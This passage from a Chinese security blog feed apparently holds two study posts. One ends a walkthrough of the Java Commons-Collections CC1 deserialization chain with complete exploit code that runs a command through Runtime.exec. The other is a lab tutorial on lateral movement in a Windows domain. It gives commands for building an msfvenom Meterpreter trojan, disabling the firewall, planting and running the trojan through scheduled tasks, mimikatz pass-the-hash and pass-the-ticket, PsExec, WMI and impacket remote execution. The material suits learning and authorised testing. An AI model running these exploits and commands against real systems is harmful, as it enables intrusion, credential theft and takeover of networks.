class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">     iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);<span class="comment">//前一对象transform方法的输出作为后一对象transform方法的输入</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以又可以将代码转换成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = new Transformer[]&#123;</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p><img src="image-20230322175528965.png" alt="image-20230322175528965"></p><p>到这里就可以解决Runtime类反序列化的问题了，并且此时调用的transform方法也从最初的InvokerTransformer.transform(runtime)变成了<code>ChainedTransformer.transform(Runtime.class)</code></p><h3 id="2个if判断语句">2个if判断语句</h3><p>首先是第一个if，核心代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type);<span class="comment">//获取指定类型的注解类型</span></span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<span class="comment">//返回一个Map类型的对象，存储了该注解类型中的所有成员变量信息，其中，键为成员变量的名称，值为成员变量的类型</span></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();<span class="comment">//获取传入的map遍历时的key，这个key我们可以自己定义</span></span><br><span class="line">Class&lt;?&gt; memberType = memberTypes.get(name);<span class="comment">//通过key获取成员变量的类型</span></span><br><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;<span class="comment">//如果成员变量存在</span></span><br></pre></td></tr></table></figure><p>要进入使条件为真的话，就要找到一个含有成员变量的注释类，这里我们找到了Retention类有个叫value的成员变量</p><p><img src="image-20230322183208737.png" alt="image-20230322183208737"></p><p>同时要修改我们传入的map的key值为value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>第二个if判断成员变量的值是否为其所声明类型的实例，而这里肯定不是，所以不需要额外做手脚</p><h3 id="setvalue-参数">setvalue()参数</h3><p>要解决这个问题其实比较靠运气，因为对于setvalue()的参数我们不太好修改，但这里恰好有一个ConstantTransformer类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个类的transform很离谱，不管输入什么都只是输出类里的iConstant，这就使得输入的参数“无效化”，同时返回的内容是我们想要的内容，于是将执行的代码做如下修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//令iConstant=Runtime.class，使得Runtime.class作为下一条的输入值</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;fdsf&quot;</span>);<span class="comment">//这里不管传入什么参数都不会影响ConstantTransformer.transform传出的值</span></span><br></pre></td></tr></table></figure><p><img src="image-20230322200354729.png" alt="image-20230322200354729"></p><p>到这里三个问题都已经得到了解决</p><h2 id="最后">最后</h2><p>最终的利用链：</p><p>AnnotationInvocationHandler.readObject()-&gt;AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;ChainedTransformer.transform()</p><p>测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.transforms.Transform;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.instrument.TransformerManager;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//创建chainedTransformer对象来执行任意代码</span></span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">        </span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler实例化</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//序列化与反序列化</span></span><br><span class="line">        Serialize(obj);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objecj</span> <span class="operator">=</span> Unserialize(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(a);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> (Object)objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20230322203254905.png" alt="image-20230322203254905"></p><p>其实但看整个利用链的话还是比较简单的，难的是有一些地方需要想办法绕过</p><p>参考视频：</p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?share_source=copy_web&amp;vd_source=c7f71b9392bbbd1398d21bf06f9a793e">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序列化与反序列化&quot;&gt;序列化与反序列化&lt;/h1&gt;
&lt;p&gt;java序列化是通过&lt;code&gt;ObjectOutputStream&lt;/code&gt;类中的&lt;code&gt;writeObject&lt;/code&gt;方法&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>后渗透之横向移动</title>
    <link href="http://example.com/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>http://example.com/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2023-03-20T13:29:27.000Z</published>
    <updated>2023-06-14T11:52:03.065Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境">环境</h1><p>已经拿下了一台域内win7的shell，同时获得了system权限<br>目标机是一台win2008，ip地址192.168.138.138</p><h1 id="ipc连接">ipc连接</h1><p>使用条件：<code>对方开启了139和445端口</code>&amp;&amp;<code>对方开启了默认共享</code><br>通过mimikatz在win7上拿到了域管理员Administrator的明文密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;Admin@123&quot; /user:Administrator</span><br></pre></td></tr></table></figure><p>通过<code>net use</code>查看已经建立的ipc连接<br><img src="59df3dbf616d4e9bbe97a20a5133463d.png" alt=""></p><h1 id="计划任务">计划任务</h1><p>思路是通过计划任务运行上传的木马文件从而拿shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#由于对方在内网，所以要通过正向连接的方式创建木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=192.168.138.138 LPORT=5555 -f exe &gt;f.exe</span><br><span class="line">#将木马复制到对方的c盘下</span><br><span class="line">copy f.exe \\192.168.138.138\c$</span><br><span class="line">#查看是否复制成功</span><br><span class="line">dir \\192.168.138.138\c$</span><br></pre></td></tr></table></figure><p><img src="3c0619264b39461bab91b56ed157b44e.png" alt=""></p><h2 id="at">at</h2><p>首先要关闭对方的防火墙，否则正向连接会失败</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看对方当前时间</span></span><br><span class="line">net time \\192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建at计划任务来关闭防火墙</span></span><br><span class="line">at \\192.168.138.138 16:28  cmd.exe /c &quot;NetSh Advfirewall set allprofiles state off&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行木马</span></span><br><span class="line">at \\192.168.138.138 16:29 C:/f.exe</span><br></pre></td></tr></table></figure><p>msf成功拿到shell<br><img src="e4a7a521ead346c18b700c9b1fef59d2.png" alt=""></p><blockquote><p>注：at任务在运行结束以后会自动将计划列表里的任务删除</p></blockquote><h2 id="schtasks">schtasks</h2><p>为了方便我们这里先将要执行的命令写到一个bat文件里，然后再运行bat文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell.bat</span></span><br><span class="line">@echo off</span><br><span class="line">c:</span><br><span class="line">NetSh Advfirewall set allprofiles state off</span><br><span class="line">f.exe</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">copy shell.bat \\192.168.138.138\c$</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建计划任务</span></span><br><span class="line">schtasks  /create /s 192.168.138.138 /tn test /ru system /tr C:/shell.bat /sc daily /st 19:25</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">s表示要连接到的远程系统</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">tn表示计划任务的名字</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ru表示运行计划任务的用户</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">tr</span>表示计划运行文件的位置</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sc表示“每”</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">st表示时间 /sc daily /st 19:25 表示 每天的19：25执行</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行计划任务</span></span><br><span class="line">schtasks  /run /s 192.168.138.138 /i /tn test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">i表示忽略时间信息直接执行</span></span><br></pre></td></tr></table></figure><blockquote><p>注：在使用schtasks的时候会留下日志文件C:/Windows/Tasks/SchedLgu.txt</p></blockquote><h1 id="哈希传递（PTH）">哈希传递（PTH）</h1><p><code>哈希传递（Pass the Hash ）攻击</code>是一种利用 Windows 系统的身份验证机制漏洞的网络攻击方式。攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限（需要管理员权限）。<br>对于win2012以上的windows，或者win2002以下的打了KB2871997补丁的windows是读不了明文的，而这种攻击方式通常利用 Windows 系统中的 NTLM 身份认证协议，攻击者可以在未授权的情况下获取到用户的 NTLM 哈希值，并使用它来尝试登录目标系统，从而执行任意操作，甚至完全控制受攻击系统。</p><p>这里为了演示，先打开win7的3389，再通过操纵win7打win2008<br>打开3389：<code>run post/windows/manage/enable_rdp</code><br>rdesktop连接：<code>rdesktop -u Administrator -p Admin@123 -d sun 192.168.135.150   </code><br><img src="511a3f8697d7446b9e34159807f16b1a.png" alt="">利用mimikatz拿到了域管理员的NTLM哈希<br><img src="11629e84de7247ea87ce697ac35695be.png" alt=""><br>哈希传递：<code>sekurlsa::pth /user:administrator /domain:sun.com /ntlm:570a9a65db8fba761c1008a51d4c95ab</code><br>此时会出现一个新的cmd窗口<br>同时我们可以通过<code>dir \\dc\c$</code>来看到域控主机c盘下的文件</p><p><img src="ef06c69c50064b1e9f694213e67e6515.png" alt=""></p><blockquote><p>注：这里只能使用域控的名字而不能使用ip地址访问</p></blockquote><h1 id="票据传递（PTT）">票据传递（PTT）</h1><p>票据传递攻击（Pass the Ticket Attack）是一种利用 Windows 系统的 Kerberos 身份验证协议漏洞的攻击方式。攻击者可以获取到受害者计算机上的 Kerberos 认证票据，并将其传递给其他系统，以获得访问权限。<br>将内存中的票据导出：<code>sekurlsa::tickets /export</code><br>可以看到出现了许多的票据文件<br><img src="ded7f799fca6446db80a9fd666a5b859.png" alt=""><br>清除内存中的票据文件：<code> kerberos::purge</code><br>将票据文件注入内存：<br><code> kerberos::ptt &quot;C:\Users\Administrator\Desktop\[0;53e35]-2-0-40e00000-Administrator@krbtgt-SUN.COM.kirbi</code><br><img src="be4859a28dd54233a3175c8f21b01dbc.png" alt=""><br>同样可以查看域控的c盘文件<br><img src="d471577d68794109bd7bd93fccecc0f1.png" alt=""></p><blockquote><p>区别：<br>票据传递攻击（Pass the Ticket Attack）和哈希传递攻击（Pass the Hash Attack）都是利用 Windows 系统中的身份验证机制漏洞的攻击方式。它们的区别在于攻击者<code>获取到的信息不同</code>。<br>票据传递攻击是基于 Kerberos 认证协议的攻击，攻击者通过获取到受害者计算机上的 <code>Kerberos 认证票据（TGT）</code>，并将其传递给其他系统来获得访问权限。<br>而哈希传递攻击则是基于 NTLM 身份认证协议的攻击，攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限。</p></blockquote><h1 id="PsExec">PsExec</h1><p><code>PsExec</code>是一个由Sysinternals（现在属于微软）开发的免费实用程序，可以在本地或远程计算机上执行命令。它允许管理员在没有登录目标计算机的情况下，远程执行命令并获取结果。PsExec利用 Windows 系统中的网络共享和远程执行服务，通过远程调用进程、服务等方式来进行远程控制（需要提前下载）。<br>PsExec 连接到目标计算机并将 PsExec 服务程序复制到目标计算机的系统目录中，同时在目标计算机上启动一个服务 (PSEXESVC)，该服务会等待来自 PsExec 的指令。PsExec 使用 Windows RPC（远程过程调用）协议与 PSEXESVC 通信，以向其发送要执行的命令。PSEXESVC 接收到命令后，会在目标计算机上启动相应的进程，并将结果返回给 PsExec。<br>在已经建立了ipc的情况下，可以直接通过psexec拿域控的system权限的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sExec.exe -accepteula \\192.168.138.138 -s cmd.exe</span><br></pre></td></tr></table></figure><p><img src="d9d529932e60460fb6d0134a9d56dfe7.png" alt=""><br>如果没有建立ipc也可以通过账户名和密码登录，但前提是该账户有<code>授权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\192.168.138.138 -u Administrator -p  Admin@123 cmd.exe</span><br></pre></td></tr></table></figure><p>这里没有授权所以失败了<br><img src="b3fd7ddf7daa4c8597816f88cb930ac3.png" alt=""><br>同时msf中也带有psexec的攻击模块（要提前搭建内网路由） <code>exploit/windows/smb/psexec  </code><br>查看options<br><img src="6710fda5114b4f859573d8a7888aef27.png" alt="">设置参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.138.138</span><br><span class="line">set smbuser Administrator</span><br><span class="line">set smbpass Admin@123</span><br></pre></td></tr></table></figure><p>成功拿到shell<br><img src="0d06b94cf3744fd8bf6f82dcb3df3719.png" alt=""><br>在msf中使用psexec如果对方防火墙开着的话，就会连接失败<br><img src="7fe56df5233f408db138f534a479876a.png" alt=""></p><h1 id="WMI">WMI</h1><p><code>WMI（Windows Management Instrumentation，Windows管理规范）</code>是一种由微软开发的系统管理技术，用于在Windows操作系统中收集和监控各种系统信息，以及执行系统管理任务。<br><code>WMIC（Windows Management Instrumentation Command-Line，Windows管理规范命令行）</code>是一种基于WMI技术的命令行工具，用于在Windows操作系统中执行系统管理任务。通过WMIC命令行工具，管理员可以使用命令行界面来调用WMI接口，并执行各种管理任务，例如获取系统信息、配置系统参数、监控性能和事件等。WMIC命令行工具提供了丰富的命令选项和参数，支持多种数据格式和输出方式，适用于本地计算机和远程计算机上的管理任务。<br>在win7中输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.138.138 /user:Administrator /password:Admin@123 process call create &quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="e7b0dd212a944905bf06a4bfbad8edd4.png" alt=""><br>win2008出现ip.txt说明命令成功执行<br><img src="0acc7f885acb4e4e95fbf27d091bcc56.png" alt=""></p><p>也可以通过impacket包（要下载）的wimexec来登录（实测有防火墙也能打）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用法：wmiexec.py user:pass@ip</span>  </span><br><span class="line">proxychains wmiexec.py administrator:Admin@123@192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">proxychains 是因为目标在内网开了代理</span></span><br></pre></td></tr></table></figure><p><img src="3e6af64105484320825ab49b2f78cc0f.png" alt=""></p><h1 id="SMB">SMB</h1><p><code>SMB（Server Message Block，服务器消息块）</code>是一种用于文件和打印机共享的网络协议，通过SMB协议，客户端可以与远程计算机上的共享资源进行通信和交互，例如读取或写入共享文件、访问共享打印机等。SMB协议基于客户端/服务器模型，其中客户端向SMB服务器发送请求，并在响应中获取所需的数据。<br><code>SMBexec</code>是一种基于SMB协议的渗透测试工具，利用SMB协议的漏洞和不安全配置与目标计算机进行通信和交互，以执行各种攻击任务。<br>impacket中有smbexec.py工具可以用来攻击<br>使用方法和wmiexec类似</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbexec.py Administrator:Admin@123@192.168.138.138   </span><br></pre></td></tr></table></figure><p><img src="aa493e42938f4eb682654418fb32567b.png" alt=""></p><h1 id="最后">最后</h1><p>除此之外，还可以利用一些windows内核漏洞（例如永恒之蓝）去横向，就不多说了。<br>可以看到大多数的横向移动都是建立在拥有一个高权限用户和获取到明文密码的前提下的，所以前期的信息收集和权限提升步骤也不必可少。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;环境&lt;/h1&gt;
&lt;p&gt;已经拿下了一台域内win7的shell，同时获得了system权限&lt;br&gt;
目标机是一台win2008，ip地址192.168.138.138&lt;/p&gt;
&lt;h1 id=&quot;ipc连接&quot;&gt;ipc连接&lt;/h1&gt;
&lt;p&gt;使用条件：&lt;code&gt;对</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="横向" scheme="http://example.com/tags/%E6%A8%AA%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>后渗透之权限提升</title>
    <link href="http://example.com/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>http://example.com/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2023-03-20T12:23:39.000Z</published>
    <updated>2023-06-14T11:52:15.708Z</updated>
    
